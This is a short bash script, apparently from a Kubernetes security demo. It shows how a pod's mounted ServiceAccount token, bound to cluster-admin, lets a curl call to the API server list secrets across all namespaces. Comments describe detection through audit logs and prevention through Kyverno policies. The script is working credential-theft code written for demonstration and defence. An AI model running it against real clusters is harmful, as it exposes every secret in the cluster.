#!/usr/bin/env bash
# ATTACK: RUN THIS FROM INSIDE THE APP POD to show the cluster-admin blast radius.
#   kubectl -n text2sql exec -it deploy/text2sql -- sh
# then paste the commands below.
#
# DETECTED BY: EKS control-plane audit logs (the SA reading cluster-wide secrets is
#   recorded). PREVENTED (for new bad workloads) by the Kyverno policies.
set -euo pipefail

APISERVER=https://kubernetes.default.svc
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat "$SA/token")

echo "[*] Using the pod's mounted ServiceAccount token (bound to cluster-admin)."
echo "[*] Reading Secrets across ALL namespaces:"
curl -s --cacert "$SA/ca.crt" -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/secrets?limit=5" | head -c 600
echo
echo "[!] One internet-facing pod can read every secret and create workloads cluster-wide."
echo "[i] This is the toxic combination a CNAPP (Wiz) surfaces: public ingress -> pod -> cluster-admin."
